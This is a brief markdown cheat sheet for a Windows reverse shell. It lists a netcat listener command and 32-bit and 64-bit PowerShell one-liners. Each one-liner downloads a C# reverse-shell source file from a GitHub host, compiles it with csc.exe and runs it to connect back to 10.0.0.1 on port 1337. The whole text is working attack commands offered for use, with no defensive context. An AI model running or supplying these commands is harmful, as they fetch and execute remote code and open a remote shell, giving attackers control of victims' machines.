##### Windows one liner reverse shell with C# 

##### attacker listen :  nc -lvp 1337

#### 32bit 
`powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sailay1996/misc-bin/master/rev.cs', '.\rev.cs') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe rev.cs && rev.exe 10.0.0.1 1337`

#### 64bit
`powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sailay1996/misc-bin/master/rev.cs', '.\rev.cs') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\csc.exe rev.cs && rev.exe 10.0.0.1 1337`
